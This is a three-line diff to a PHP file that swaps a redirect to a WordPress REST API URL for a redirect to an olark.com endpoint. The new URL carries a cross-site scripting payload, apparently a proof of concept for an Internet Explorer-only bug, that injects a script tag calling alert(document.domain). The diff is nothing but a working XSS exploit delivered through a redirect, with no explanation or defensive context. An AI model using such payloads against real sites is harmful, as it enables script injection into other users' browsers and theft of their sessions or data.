@@ -1,3 +1,3 @@
 <?php
-header('location: https://public-api.wordpress.com/rest/v1.1/sites/missoum1307.wordpress.com/posts/?number=1');
+header('location: https://nrpc.olark.com/nrpc/p?j=olark-xss-ie-only-<?PXML><html:script>alert(document.domain)</html:script>');
 ?>
